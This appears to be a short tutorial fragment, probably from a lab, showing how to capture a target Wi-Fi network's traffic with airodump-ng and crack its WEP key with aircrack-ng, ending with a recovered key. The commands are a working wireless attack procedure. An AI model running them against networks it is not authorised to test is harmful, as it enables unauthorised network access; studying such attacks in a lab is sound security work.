- - -
# Attacking Steps : 

#### Logging the traffic : 
Ok so all we need to do is to run  airodump-ng to log all traffic from the target network.

```sh
airodump-ng --channel 69 --bssid AA:AA:AA:AA:AA:AA --write basic-test-ap mon0
```

![Imgur](https://i.imgur.com/85iCgKg.png)

#### Trying to crack the key : 

At the same time we shall use aircrack-ng to try and crack the key using the capture files created by the above command.

```sh
aircrack-ng basic-test-ap-01.cap
```

> [!attention]
> - Keep Both programs running at the same time. So that aircrack-ng will be able to crack the key.

![Imgur](https://i.imgur.com/P9jDb8Y.png)

Here the **Key** is : `BA:8C:E7:60:CA`,  but the way to use it is : `BA8CE760CA`.  ( Removed '**:**' )
- - -

